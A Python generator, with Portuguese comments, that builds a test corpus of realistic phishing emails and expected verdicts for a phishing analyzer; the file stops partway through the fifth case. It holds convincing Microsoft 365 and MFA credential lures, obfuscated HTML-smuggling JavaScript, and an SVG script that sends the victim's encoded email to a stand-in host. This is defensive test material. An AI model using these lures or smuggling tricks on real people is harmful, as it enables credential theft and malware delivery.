# Gera o CONJUNTO DE REFERÊNCIA do analisador: e-mails .eml realistas (phishing, legítimos e spam)
# e o gabarito de cada um (tests/corpus/casos.json), usado por tests/avaliar-corpus.js.
#
# Uso (a partir da raiz do repositório):
#   pip install --target <pasta-temporária> segno==1.6.6      (só para gerar o QR Code do caso de quishing)
#   python -I tests/corpus/gerar-corpus.py --libs <pasta-temporária>
#
# Regras de segurança do conjunto (o repositório é público):
#  - Todo domínio do ATACANTE termina em .example (RFC 2606: reservado, nunca existirá na internet).
#  - Todo IP do atacante é de documentação (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, RFC 5737).
#    O avaliador trata esses IPs como públicos só durante o teste.
#  - Domínios e IPs REAIS só aparecem como infraestrutura legítima (Microsoft, Google, PayPal, DocuSign, Itaú...),
#    do jeito que aparecem nos e-mails de verdade. Empresas, pessoas, telefones (prefixo 0, inválido) e contas
#    bancárias (zeros) são fictícios; nomes de tenant do SharePoint são inventados.
#  - Anexos são inofensivos: o .zip "contrabandeado" tem só um LEIA-ME.txt; o .lnk é texto; o PDF é um PDF mínimo.
#    O que importa para o teste é a ESTRUTURA (extensões, JavaScript, base64, QR Code), não um malware de verdade.
#  - A organização é fictícia: Cybersecurity Ltda, domínio cybersecurity.local.
#
# O resultado é determinístico (datas, fronteiras MIME e zips fixos): rodar de novo gera os mesmos bytes.
import base64
import hashlib
import sys
import io
import json
import os
import zipfile
from email.charset import QP, Charset
from email.generator import Generator
from email.header import Header
from email import encoders
from email.mime.base import MIMEBase
from email.mime.message import MIMEMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import message_from_string

AQUI = os.path.dirname(os.path.abspath(__file__))
PASTA_EML = os.path.join(AQUI, 'eml')
ORG = 'cybersecurity.local'
EXO = 'CP8PR80MB4932.lamprd80.prod.outlook.com'  # caixa da organização no Exchange Online (fictícia no formato real)

UTF8_QP = Charset('utf-8')
UTF8_QP.body_encoding = QP
UTF8_QP.header_encoding = None


# ---------------------------------------------------------------- utilidades de cabeçalho

def nome_codificado(nome, email):
    """'Nome com acento <a@b>' do jeito que o Outlook manda (RFC 2047 só quando precisa)."""
    if not nome:
        return f'<{email}>'
    try:
        nome.encode('ascii')
        return f'"{nome}" <{email}>' if any(c in nome for c in ',.:;@<>"') else f'{nome} <{email}>'
    except UnicodeEncodeError:
        return f'{Header(nome, "utf-8").encode(linesep=" ")} <{email}>'


def assunto(texto):
    try:
        texto.encode('ascii')
        return texto
    except UnicodeEncodeError:
        return Header(texto, 'utf-8').encode(linesep=' ')  # a dobra fica por conta de dobrar()


def dobrar(nome, valor, largura=78):
    """Dobra um cabeçalho longo em espaços, como os servidores fazem (continuação com TAB)."""
    linha = f'{nome}: {valor}'
    if len(linha) <= largura:
        return linha
    partes = [p for p in linha.split(' ') if p]
    linhas, atual = [], ''
    for i, p in enumerate(partes):
        # Nunca quebra logo depois de "Nome:" (servidores reais põem o 1º pedaço na mesma linha).
        if atual and i > 1 and len(atual) + 1 + len(p) > largura:
            linhas.append(atual)
            atual = '\t' + p
        else:
            atual = f'{atual} {p}' if atual else p
    linhas.append(atual)
    return '\r\n'.join(linhas)


def received_exo(origem_host, origem_ip, data_utc, tls='TLS1_3, cipher=TLS_AES_256_GCM_SHA384', frontend='CP2PEPF0000012A'):
    """Cadeia de Received do Exchange Online (de cima para baixo: mais novo primeiro)."""
    return [
        ('Received', f'from CP6P284CA0054.BRAP284.PROD.OUTLOOK.COM (2603:10d6:103:1ab::7) by {EXO} '
                     f'(2603:10d6:103:12c::9) with Microsoft SMTP Server (version=TLS1_2, '
                     f'cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.8722.18; {data_utc}'),
        ('Received', f'from {frontend}.BRAP284.PROD.OUTLOOK.COM (2603:10d6:103:1ab:cafe::4b) by '
                     f'CP6P284CA0054.outlook.office365.com (2603:10d6:103:1ab::7) with Microsoft SMTP Server '
                     f'(version=TLS1_3, cipher=TLS_AES_256_GCM_SHA384) id 15.20.8722.18 via Frontend Transport; {data_utc}'),
    ], ('Received', f'from {origem_host} ({origem_ip}) by {frontend}.mail.protection.outlook.com (10.167.243.36) '
                    f'with Microsoft SMTP Server (version={tls}) id 15.20.8722.10 via Frontend Transport; {data_utc}')


def autenticacao_exo(ip, mailfrom, header_from, spf, dkim, dmarc, dkim_d=None, acao=None, compauth=None):
    dkim_txt = {'pass': f'pass (signature was verified) header.d={dkim_d or header_from}',
                'none': 'none (message not signed) header.d=none',
                'fail': f'fail (body hash did not verify) header.d={dkim_d or header_from}'}[dkim]
    spf_txt = {'pass': f'pass (sender IP is {ip})', 'fail': f'fail (sender IP is {ip})',
               'softfail': f'softfail (sender IP is {ip})', 'none': f'none (sender IP is {ip})'}[spf]
    acao = acao or ('none' if dmarc == 'pass' else 'quarantine' if dmarc == 'fail' else 'none')
    compauth = compauth or ('pass reason=100' if dmarc == 'pass' else 'fail reason=000' if dmarc == 'fail' else 'softpass reason=201')
    ar = (f'spf={spf_txt} smtp.mailfrom={mailfrom}; dkim={dkim_txt};dmarc={dmarc} action={acao} '
          f'header.from={header_from};compauth={compauth}')
    spf_cab = {'pass': 'Pass', 'fail': 'Fail', 'softfail': 'SoftFail', 'none': 'None'}[spf]
    designa = 'designates' if spf == 'pass' else 'does not designate'
    received_spf = (f'{spf_cab} (protection.outlook.com: domain of {mailfrom} {designa} {ip} as permitted sender) '
                    f'receiver=protection.outlook.com; client-ip={ip}; helo={mailfrom};')
    return [('Authentication-Results', ar), ('Received-SPF', received_spf)]


def antispam_exo(scl=1):
    return [
        ('X-MS-Exchange-Organization-SCL', str(scl)),
        ('X-Forefront-Antispam-Report', f'CTRY:;LANG:pt;SCL:{scl};SRV:;IPV:NLI;SFV:{"SPM" if scl >= 5 else "NSPM"};'
                                        f'H:{EXO};PTR:;CAT:NONE;SFS:(13230040)(4022899009);DIR:INB;'),
        ('X-MS-Exchange-Organization-AuthAs', 'Anonymous'),
        ('X-MS-Exchange-Organization-AuthSource', 'CP2PEPF0000012A.BRAP284.PROD.OUTLOOK.COM'),
        ('X-MS-Exchange-Transport-CrossTenantHeadersStamped', EXO),
    ]


def dkim_assinatura(d, s='s1'):
    return ('DKIM-Signature', f'v=1; a=rsa-sha256; c=relaxed/relaxed; d={d}; s={s}; '
                              f'h=from:to:subject:date:message-id:mime-version:content-type; '
                              f'bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=; '
                              f'b=Q2NvcnB1cy1kZS10ZXN0ZS1hbmFsaXNhZG9yLXBoaXNoaW5nLWdscGktYXNzaW5hdHVyYS1maWN0aWNpYQ==')


# ---------------------------------------------------------------- utilidades de corpo e anexos

def texto(conteudo):
    return MIMEText(conteudo, 'plain', UTF8_QP)


def html(conteudo):
    return MIMEText(conteudo, 'html', UTF8_QP)


def alternativo(txt, htm, fronteira):
    alt = MIMEMultipart('alternative')
    alt.set_boundary(fronteira)
    alt.attach(texto(txt))
    alt.attach(html(htm))
    return alt


def anexo(dados, tipo, nome, inline_cid=None):
    principal, sub = tipo.split('/')
    parte = MIMEBase(principal, sub)
    parte.set_payload(dados)
    encoders.encode_base64(parte)
    parte.set_param('name', nome)
    if inline_cid:
        parte.add_header('Content-Disposition', 'inline', filename=nome)
        parte.add_header('Content-ID', f'<{inline_cid}>')
    else:
        parte.add_header('Content-Disposition', 'attachment', filename=nome)
    return parte


def pdf_minimo(linhas):
    """PDF 1.4 válido e inofensivo (só texto), com xref correto."""
    conteudo = 'BT /F1 11 Tf 50 780 Td 14 TL ' + ' '.join(
        f'({l.encode("latin-1", "replace").decode("latin-1").replace("(", "[").replace(")", "]")}) \'' for l in linhas) + ' ET'
    objetos = [
        '<< /Type /Catalog /Pages 2 0 R >>',
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
        f'<< /Length {len(conteudo.encode("latin-1"))} >>\nstream\n{conteudo}\nendstream',
        '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    ]
    saida = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
    posicoes = []
    for i, o in enumerate(objetos, 1):
        posicoes.append(len(saida))
        saida += f'{i} 0 obj\n{o}\nendobj\n'.encode('latin-1')
    xref = len(saida)
    saida += f'xref\n0 {len(objetos) + 1}\n0000000000 65535 f \n'.encode()
    for p in posicoes:
        saida += f'{p:010d} 00000 n \n'.encode()
    saida += f'trailer\n<< /Size {len(objetos) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode()
    return saida


def zip_fixo(arquivos):
    """Zip determinístico (data fixa). arquivos = [(nome, bytes)]."""
    b = io.BytesIO()
    with zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED) as z:
        for nome, dados in arquivos:
            info = zipfile.ZipInfo(nome, date_time=(2026, 11, 9, 8, 41, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o644 << 16
            z.writestr(info, dados)
    return b.getvalue()


LEIA_ME = ('ARQUIVO DE TESTE do conjunto de referência do analisador-phishing-glpi.\r\n'
           'Não é malware: num ataque real, aqui estaria o executável ou script do atacante.\r\n').encode('utf-8')


def qr_png(conteudo):
    if '--libs' in sys.argv:
        sys.path.append(sys.argv[sys.argv.index('--libs') + 1])
    try:
        import segno
    except ImportError as erro:
        raise SystemExit('Falta o segno para gerar o QR Code: pip install --target <pasta> segno==1.6.6 '
                         'e rode com --libs <pasta>') from erro
    b = io.BytesIO()
    segno.make(conteudo, error='m').save(b, kind='png', scale=6, border=4)
    return b.getvalue()


def b64(s):
    return base64.b64encode(s.encode()).decode()


def qr_matriz(conteudo):
    """Módulos do QR (True = escuro), sem a margem."""
    if '--libs' in sys.argv:
        sys.path.append(sys.argv[sys.argv.index('--libs') + 1])
    import segno
    return [[bool(v) for v in linha] for linha in segno.make(conteudo, error='m').matrix]


def pdf_com_qr(linhas, conteudo):
    """PDF 1.4 inofensivo com texto e o QR Code como imagem (tons de cinza, FlateDecode)."""
    import zlib
    m = qr_matriz(conteudo)
    margem = 4
    lado = len(m) + 2 * margem
    pixels = bytearray()
    for y in range(lado):
        for x in range(lado):
            yy, xx = y - margem, x - margem
            escuro = 0 <= yy < len(m) and 0 <= xx < len(m) and m[yy][xx]
            pixels.append(0 if escuro else 255)
    imagem = zlib.compress(bytes(pixels), 9)
    texto = 'BT /F1 11 Tf 50 780 Td 14 TL ' + ' '.join(
        f'({l.encode("latin-1", "replace").decode("latin-1").replace("(", "[").replace(")", "]")}) \'' for l in linhas) + ' ET'
    desenho = texto + ' q 170 0 0 170 50 520 cm /Im1 Do Q'
    objetos = [
        b'<< /Type /Catalog /Pages 2 0 R >>',
        b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R '
        b'/Resources << /Font << /F1 5 0 R >> /XObject << /Im1 6 0 R >> >> >>',
        f'<< /Length {len(desenho.encode("latin-1"))} >>\nstream\n{desenho}\nendstream'.encode('latin-1'),
        b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
        (f'<< /Type /XObject /Subtype /Image /Width {lado} /Height {lado} /ColorSpace /DeviceGray '
         f'/BitsPerComponent 8 /Filter /FlateDecode /Length {len(imagem)} >>\nstream\n').encode('latin-1') + imagem + b'\nendstream',
    ]
    saida = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
    posicoes = []
    for i, o in enumerate(objetos, 1):
        posicoes.append(len(saida))
        saida += f'{i} 0 obj\n'.encode() + o + b'\nendobj\n'
    xref = len(saida)
    saida += f'xref\n0 {len(objetos) + 1}\n0000000000 65535 f \n'.encode()
    for p in posicoes:
        saida += f'{p:010d} 00000 n \n'.encode()
    saida += f'trailer\n<< /Size {len(objetos) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode()
    return saida


def qr_tabela_html(conteudo, px=4):
    """QR "desenhado" com tabela HTML (uma célula por módulo), como fazem os kits que fogem de filtro de imagem."""
    m = qr_matriz(conteudo)
    margem = 4
    lado = len(m) + 2 * margem
    linhas = []
    for y in range(lado):
        celulas = []
        for x in range(lado):
            yy, xx = y - margem, x - margem
            escuro = 0 <= yy < len(m) and 0 <= xx < len(m) and m[yy][xx]
            celulas.append(f'<td style="width:{px}px;height:{px}px;background-color:{"#000000" if escuro else "#ffffff"}"></td>')
        linhas.append('<tr>' + ''.join(celulas) + '</tr>')
    return '<table cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse">' + ''.join(linhas) + '</table>'


def pix_copia_e_cola(chave, nome, cidade, valor, txid):
    """BR Code do PIX (padrão EMV do Banco Central), com o CRC16 no fim, como num boleto de verdade."""
    campo = lambda i, v: f'{i}{len(v):02d}{v}'
    conta = campo('00', 'br.gov.bcb.pix') + campo('01', chave)
    corpo = (campo('00', '01') + campo('26', conta) + campo('52', '0000') + campo('53', '986') + campo('54', valor)
             + campo('58', 'BR') + campo('59', nome) + campo('60', cidade) + campo('62', campo('05', txid)) + '6304')
    crc = 0xFFFF
    for b in corpo.encode():
        crc ^= b << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) if crc & 0x8000 else crc << 1
            crc &= 0xFFFF
    return corpo + f'{crc:04X}'


# ---------------------------------------------------------------- montagem do .eml

def montar(cabecalhos, corpo):
    """Cabeçalhos na ordem dada (como o servidor gravou) + corpo MIME gerado pela biblioteca."""
    # As classes MIME do Python põem MIME-Version em toda parte; num e-mail real ele aparece só no topo.
    for parte in corpo.walk():
        del parte['MIME-Version']
    for parte in corpo.walk():
        if parte.get_content_type() == 'message/rfc822':
            parte.get_payload(0)['MIME-Version'] = '1.0'  # o e-mail encaminhado é uma mensagem completa
    corpo['MIME-Version'] = '1.0'
    bruto = io.StringIO()
    Generator(bruto, mangle_from_=False, maxheaderlen=78).flatten(corpo)
    mime = bruto.getvalue()
    # O Generator põe os cabeçalhos MIME (Content-Type, MIME-Version...) antes do corpo: mantemos esses.
    linhas = [dobrar(n, v) for n, v in cabecalhos]
    final = '\r\n'.join(linhas) + '\r\n' + mime.replace('\r\n', '\n').replace('\n', '\r\n')
    lido = message_from_string(final)  # confere que o Python lê de volta e que os cabeçalhos não "vazaram" para o corpo
    if not lido['From'] or '\r\n\r\n' in final.split('\r\nContent-Type:', 1)[0]:
        raise SystemExit('cabeçalhos quebrados (linha em branco antes do Content-Type)')
    return final.encode('utf-8')


CASOS = []


def caso(**c):
    CASOS.append(c)


# ================================================================ PHISHING

# 01 ---------------------------------------------------------------- credenciais Microsoft 365 com domínio sósia
dom = 'rnicrosoft-online.example'
ip = '203.0.113.45'
data = 'Mon, 9 Nov 2026 11:02:51 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
alvo = f'https://{dom}/owa/auth/logon.aspx?replaceCurrent=1&login_hint=maria.souza%40{ORG}'
htm = f'''<html><head><meta charset="utf-8"></head><body style="font-family:Segoe UI,Arial,sans-serif;color:#323130">
<table width="100%" cellpadding="0" cellspacing="0"><tr><td style="padding:24px 0">
<img src="https://{dom}/assets/ms-logo.png" alt="Microsoft" width="108" height="23"></td></tr>
<tr><td style="font-size:22px;padding-bottom:12px">Sua senha expira hoje</td></tr>
<tr><td style="font-size:14px;line-height:20px">Olá, maria.souza@{ORG}<br><br>
A senha da sua conta do Microsoft 365 expira hoje às 23:59. Para evitar a perda de acesso ao Outlook, Teams e OneDrive,
mantenha a sua senha atual pelo link abaixo. Caso contrário a sua conta será bloqueada e as mensagens novas serão recusadas.<br><br>
<a href="{alvo}" style="background:#0078d4;color:#fff;padding:10px 20px;text-decoration:none">https://portal.office.com/manter-senha</a><br><br>
Obrigado,<br>Equipe de contas Microsoft</td></tr>
<tr><td style="font-size:11px;color:#8a8886;padding-top:24px">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</td></tr>
</table></body></html>'''
txt = (f'Sua senha expira hoje\n\nOlá, maria.souza@{ORG}\n\nA senha da sua conta do Microsoft 365 expira hoje às 23:59. '
       'Para evitar a perda de acesso ao Outlook, Teams e OneDrive, mantenha a sua senha atual pelo link abaixo. '
       'Caso contrário a sua conta será bloqueada e as mensagens novas serão recusadas.\n\n'
       f'https://portal.office.com/manter-senha <{alvo}>\n\nObrigado,\nEquipe de contas Microsoft\n')
corpo = alternativo(txt, htm, '_000_CP8PR80MB4932A1F0E2_')
caso(
    id='01-m365-senha-expirando',
    titulo='Credenciais do Microsoft 365: "sua senha expira hoje" com domínio sósia (rn no lugar de m)',
    tecnica='Página falsa de login do Microsoft 365 em domínio novo e bem configurado (SPF/DKIM/DMARC passam)',
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Microsoft 365', f'no-reply@{dom}')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Ação necessária: sua senha expira hoje')),
               ('Date', data), ('Message-ID', f'<20261109110251.4f2a9c@{dom}>'), ('X-Mailer', 'PHPMailer 6.9.1'),
               *antispam_exo()],
    corpo=corpo,
    relato='Recebi esse e-mail da Microsoft dizendo que minha senha expira hoje. Não cliquei, achei estranho o endereço.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002', 'T1598.003']),
    sinais_obrigatorios=['marca', 'link-disfarcado', 'urgencia'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=['portal.office.com', 'office.com', ORG]),
    reputacao=dict(rdap={dom: 4}),
)

# 02 ---------------------------------------------------------------- AiTM via conta comprometida de fornecedor
dom = 'escritoriomoreira.example'
ip = '198.51.100.23'
data = 'Mon, 9 Nov 2026 13:47:10 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
vitima64 = base64.b64encode(f'carla.mendes@{ORG}'.encode()).decode()
alvo = f'https://proposta-moreira-adv.pages.dev/?e={vitima64}'
htm = f'''<html><body style="font-family:Calibri,Arial,sans-serif;font-size:11pt">
<p>Boa tarde, Carla,</p>
<p>Segue a proposta revisada de honorários referente ao contrato de 2027, conforme conversamos.</p>
<table style="border:1px solid #e1dfdd;padding:16px;width:420px"><tr><td>
<img src="cid:pdficon" width="32" height="32" alt=""> <b>Proposta_Honorarios_2027_rev3.pdf</b><br>
<span style="color:#605e5c">Escritório Moreira Advogados compartilhou este arquivo com você</span><br><br>
<a href="{alvo}" style="background:#0f6cbd;color:#fff;padding:8px 18px;text-decoration:none">Abrir documento</a>
</td></tr></table>
<p>Qualquer dúvida, estou à disposição.</p>
<p>Atenciosamente,<br><b>Renata Moreira</b><br>Sócia | Escritório Moreira Advogados<br>(11) 0256-0000</p>
</body></html>'''
txt = ('Boa tarde, Carla,\n\nSegue a proposta revisada de honorários referente ao contrato de 2027, conforme conversamos.\n\n'
       'Proposta_Honorarios_2027_rev3.pdf\nEscritório Moreira Advogados compartilhou este arquivo com você\n'
       f'Abrir documento: {alvo}\n\nQualquer dúvida, estou à disposição.\n\nAtenciosamente,\nRenata Moreira\n'
       'Sócia | Escritório Moreira Advogados\n(11) 0256-0000\n')
corpo = alternativo(txt, htm, '_000_FR2P281MB0112C3D9_')
caso(
    id='02-aitm-conta-fornecedor-comprometida',
    titulo='AiTM: conta real de um escritório parceiro foi invadida e manda "documento compartilhado"',
    tecnica=('Adversary-in-the-Middle (kit tipo Tycoon 2FA/EvilProxy): o link leva a uma página em Cloudflare Pages '
             'com o e-mail da vítima em base64 na URL, que faz proxy do login real da Microsoft e rouba o cookie de sessão '
             '(passa por cima do MFA). O e-mail sai do servidor legítimo do parceiro: SPF/DKIM/DMARC passam.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom, 'selector1'),
               ('From', nome_codificado('Renata Moreira', f'renata@{dom}')),
               ('To', f'carla.mendes@{ORG}'),
               ('Subject', assunto('Proposta de honorários 2027 - revisão 3')),
               ('Date', data), ('Message-ID', f'<FR2P281MB0112C3D9A0B1@FR2P281MB0112.DEUP281.PROD.OUTLOOK.COM>'),
               ('Thread-Topic', assunto('Proposta de honorários 2027 - revisão 3')),
               ('X-MS-Has-Attach', ''), ('X-MS-TNEF-Correlator', ''), *antispam_exo()],
    corpo=corpo,
    relato=('A Renata do Escritório Moreira me mandou uma proposta, mas não estávamos negociando nada com eles agora. '
            'Abri o link e apareceu uma verificação "não sou robô" e depois a tela de login da Microsoft. '
            'Digitei minha senha e aprovei o MFA no celular, mas o documento não abriu.'),
    requerente='carla.mendes (Diretoria)',
    esperado=dict(classificacao='phishing', phishing_type=['AiTM', 'Credential Harvesting'], delivery_channel='Email',
                  target='Executive', gravidade='critica', mitre=['T1566.002', 'T1557', 'T1539']),
    sinais_obrigatorios=['hospedagem', 'aitm-isca', 'compartilhamento-falso', 'relato-pagina-falsa'],
    bloqueio=dict(deve_ter=['proposta-moreira-adv.pages.dev'], nao_pode_ter=['pages.dev']),
    reputacao=dict(rdap={dom: 3412}),
)

# 03 ---------------------------------------------------------------- quishing (QR Code em imagem, quase sem texto)
dom = 'cybersecurity-ti.example'
ip = '203.0.113.88'
data = 'Tue, 10 Nov 2026 10:15:33 +0000'
rec, rec_ext = received_exo(f'smtp.{dom}', ip, data)
destino_qr = f'https://mfa-cybersecurity.example/r/?u={base64.b64encode(f"pedro.alves@{ORG}".encode()).decode()}'
htm = f'''<html><body style="font-family:Arial,sans-serif;font-size:13px">
<p><b>Central de Serviços de TI</b></p>
<p>Prezado(a) colaborador(a),</p>
<p>Por exigência da nova política de segurança, a autenticação multifator (MFA) da sua conta precisa ser reconfigurada
até <b>13/11/2026</b>. Escaneie o QR Code abaixo com a câmera do seu celular e siga as instruções.</p>
<p><img src="cid:qr-mfa-2026" width="220" height="220" alt="QR"></p>
<p>Contas não reconfiguradas no prazo serão desativadas.</p>
<p>Central de Serviços de TI<br>Cybersecurity Ltda</p></body></html>'''
txt = ('Central de Serviços de TI\n\nPrezado(a) colaborador(a),\n\nPor exigência da nova política de segurança, a autenticação '
       'multifator (MFA) da sua conta precisa ser reconfigurada até 13/11/2026. Escaneie o QR Code abaixo com a câmera do '
       'seu celular e siga as instruções.\n\n[imagem]\n\nContas não reconfiguradas no prazo serão desativadas.\n\n'
       'Central de Serviços de TI\nCybersecurity Ltda\n')
corpo = MIMEMultipart('related')
corpo.set_boundary('----=_NextPart_001_0042_01DB3A1C.5E2F7A40')
corpo.attach(alternativo(txt, htm, '----=_NextPart_002_0043_01DB3A1C.5E2F7A40'))
corpo.attach(anexo(qr_png(destino_qr), 'image/png', 'image001.png', inline_cid='qr-mfa-2026'))
caso(
    id='03-quishing-mfa',
    titulo='Quishing: "reconfigure o MFA" com QR Code em imagem, imitando a TI da própria empresa',
    tecnica=('QR Code Phishing: o link fica dentro de uma imagem (filtros de e-mail não leem) e a vítima abre no celular, '
             'fora da proteção do computador. Imita a TI interna com um domínio parecido com o da empresa.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none', compauth='softpass reason=201'), rec_ext,
               ('From', nome_codificado('Central de Serviços de TI', f'servicedesk@{dom}')),
               ('To', f'pedro.alves@{ORG}'), ('Subject', assunto('[Obrigatório] Reconfiguração do MFA até 13/11')),
               ('Date', data), ('Message-ID', f'<a81f3c20b9e44d5e9f1c@{dom}>'), ('X-Mailer', 'Microsoft Outlook 16.0'),
               *antispam_exo()],
    corpo=corpo,
    relato='Chegou esse pedido da TI para reconfigurar o MFA pelo QR Code. É de vocês? Não escaneei.',
    requerente='pedro.alves (TI)',
    esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002', 'T1656']),
    sinais_obrigatorios=['qrcode', 'imita-organizacao', 'qrcode-decodificado', 'aitm-isca'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 2}),
    ioc_escondido='mfa-cybersecurity.example',
    qr={'image001.png': [destino_qr]},
)

# 04 ---------------------------------------------------------------- HTML smuggling (nota fiscal)
dom = 'nfe-eletronica-sefaz.example'
ip = '192.0.2.77'
data = 'Tue, 10 Nov 2026 12:31:08 +0000'
rec, rec_ext = received_exo(f'vps-4471.{dom}', ip, data)
zip_contrabandeado = zip_fixo([('NFe_88413/LEIA-ME.txt', LEIA_ME)])
pagina = f'''<!DOCTYPE html>
<html lang="pt-br"><head><meta charset="utf-8"><title>Nota Fiscal Eletr&ocirc;nica - SEFAZ</title>
<style>body{{font-family:Arial;background:#f3f3f3;text-align:center;padding-top:80px}}</style></head>
<body><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt=""><h3>Carregando documento fiscal...</h3>
<p>Se o download n&atilde;o iniciar, habilite os downloads deste site.</p>
<script>
var _0x1a=["{base64.b64encode(zip_contrabandeado).decode()}","NFe_88413.zip","application/octet-stream"];
function _0x2b(s){{var b=atob(s),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++){{u[i]=b.charCodeAt(i)}}return u}}
var _0x3c=new Blob([_0x2b(_0x1a[0])],{{type:_0x1a[2]}});
var _0x4d=document.createElement("a");_0x4d.href=window.URL.createObjectURL(_0x3c);_0x4d.download=_0x1a[1];
document.body.appendChild(_0x4d);_0x4d.click();
</script></body></html>'''.encode('utf-8')
txt = ('Prezado cliente,\n\nSegue em anexo a Nota Fiscal Eletrônica (NF-e) nº 88413 referente à fatura em aberto com '
       'vencimento em 12/11/2026, no valor de R$ 4.870,00.\n\nPara visualizar o DANFE e o boleto, abra o arquivo anexo.\n\n'
       'Departamento Fiscal\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('b1_7f3d2c9a8e1b4f60a2d5c7e9f1a3b5c7')
corpo.attach(texto(txt))
corpo.attach(anexo(pagina, 'text/html', 'NFe_88413_DANFE.html'))
caso(
    id='04-html-smuggling-nfe',
    titulo='HTML smuggling: "Nota Fiscal Eletrônica" com anexo .html que monta um .zip no navegador',
    tecnica=('HTML Smuggling: o anexo é uma página que decodifica um base64 com atob(), cria um Blob e força o download '
             'de um .zip. O arquivo nasce dentro do navegador, então o gateway de e-mail nunca vê o .zip.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'softfail', 'none', 'fail'), rec_ext,
               ('From', nome_codificado('NF-e Departamento Fiscal', f'nfe@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('NF-e 88413 - Fatura em aberto vence 12/11')),
               ('Date', data), ('Message-ID', f'<7f3d2c9a8e1b4f60@{dom}>'), ('X-Mailer', 'PHPMailer 6.8.0'),
               *antispam_exo(scl=5)],
    corpo=corpo,
    relato='Não reconheço essa nota fiscal, não temos compra com essa empresa. Não abri o anexo.',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='phishing', phishing_type=['Malware Delivery'], delivery_channel='Email',
                  target='Finance', gravidade='media', mitre=['T1566.001', 'T1027.006', 'T1204.002']),
    sinais_obrigatorios=['anexo-perigoso', 'spf', 'dmarc', 'pagamento', 'html-smuggling'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 11}),
)

# 05 ---------------------------------------------------------------- SVG com JavaScript (mensagem de voz)
dom = 'voip-cloudpbx.example'
ip = '203.0.113.140'
data = 'Tue, 10 Nov 2026 15:02:44 +0000'
rec, rec_ext = received_exo(f'out-03.{dom}', ip, data)
svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="420" height="110" viewBox="0 0 420 110">
<rect width="420" height="110" rx="10" fill="#1f6feb"/>
<text x="24" y="48" font-family="Arial" font-size="20" fill="#fff">&#9654; Mensagem de voz (00:47)</text>
<text x="24" y="80" font-family="Arial" font-size="13" fill="#dbe9ff">De: +55 11 9xxxx-4410</text>
<script type="text/javascript"><![CDATA[
var _e = "{base64.b64encode(f'lucas.ferreira@{ORG}'.encode()).decode()}";
window.location.href = atob("{b64('https://voicemail-player.example/l/?id=')}") + _e;
]]></script>
</svg>'''.encode('utf-8')
txt = ('Você recebeu uma nova mensagem de voz.\n\nDe: +55 11 9xxxx-4410\nDuração: 00:47\nRecebida: 10/11/2026 12:01\n\n'
       'Abra o anexo para ouvir.\n\nCloud PBX - Notificações\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_88231_1450092612.1762786964000')
corpo.attach(texto(txt))
corpo.attach(anexo(svg, 'image/svg+xml', 'VM_00-47s_+5511xxxx4410.svg'))
caso(
    id='05-svg-smuggling-mensagem-de-voz',
    titulo='SVG com JavaScript: "nova mensagem de voz" que redireciona para página falsa',
    tecnica=('SVG Smuggling: SVG é imagem, mas aceita <script>. Ao abrir no navegador, o JavaScript monta a URL com '
             'atob() e leva a vítima para a página falsa, já com o e-mail dela no endereço.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Cloud PBX', f'voicemail@{dom}')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Nova mensagem de voz de +55 11 9xxxx-4410 (00:47)')),
               ('Date', data), ('Message-ID', f'<88231.1450092612.1762786964000@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Recebi aviso de mensagem de voz por e-mail, mas a gente nem usa esse sistema. Abri o anexo e ele abriu o navegador numa página da Microsoft pedindo login, fechei na hora.',
